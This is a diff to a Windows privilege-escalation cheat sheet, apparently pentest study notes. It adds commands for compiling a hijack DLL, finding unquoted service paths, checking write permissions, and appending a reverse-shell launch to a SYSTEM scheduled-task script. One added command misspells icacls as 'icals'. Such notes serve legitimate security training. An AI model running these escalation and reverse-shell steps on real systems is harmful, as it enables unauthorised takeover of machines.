@@ -3116,6 +3116,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
     return TRUE;
 }
 ```
+- `x86_64-w64-mingw32-gcc dllh.cpp --shared -o dllh.dll`
 
 **Resources**
 - [hijacklibs.net](https://hijacklibs.net/)
@@ -4008,7 +4009,10 @@ net start/stop <name>                            Start/Stop a service
 2. Query a service. If it runs with `SYSTEM` privileges (check `SERVICE_START_NAME`) and the `BINARY_PATH_NAME` value is unquoted and contains spaces, it's possible a privilege escalation
    - `sc qc <service>`
    - Example: `BINARY_PATH_NAME: C:\Program Files\Unquoted Path Service\Common Results\unquotedpathservice.exe`
+   - You can also use the Powershell command `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """`
 3. Use AccessChk to check write permissions in this directory `C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"`
+   - You can review the permissions with `icacls "C:\"` and `icacls "C:\Program Files\Enterprise Apps"`
+   - Check if you can run and stop the service with `Start-Service GammaService` and `Stop-Service`
 4. Copy the reverse shell `copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"`
 5. Start a listener on the attacker machine and run the service
 
@@ -4124,9 +4128,12 @@ Also called "Service Binary Hijacking". Exploit insecure file permissions on ser
 1. List all scheduled tasks your user can see:
    - `schtasks /query /fo LIST /v`
    - In PowerShell: `Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State`
-2. Search in Task Manager for any scheduled task. See if you find any `.ps1` script.
-3. If the script found run as `SYSTEM`, check the write permissions of it with `C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\<script>.ps1`
-4. Add to it a line to run the reverse shell `echo C:\PrivEsc\reverse.exe >> C:\<script>.ps1`
+2. Search in Task Manager for any scheduled task
+   1. See if you find any `.ps1` script.
+      - If the script found run as `SYSTEM`, check the write permissions of it with `C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\<script>.ps1`
+      - Add to it a line to run the reverse shell `echo C:\PrivEsc\reverse.exe >> C:\<script>.ps1`
+   2. For the `.exe`, review the permissions with `icals C:\Users\Documents\service.exe`
+      - If you have full access permissions, substitute the `.exe` as in the section [Insecure File Permissions](#insecure-file-permissions)
 
 
 #### <ins>Insecure GUI Apps</ins>
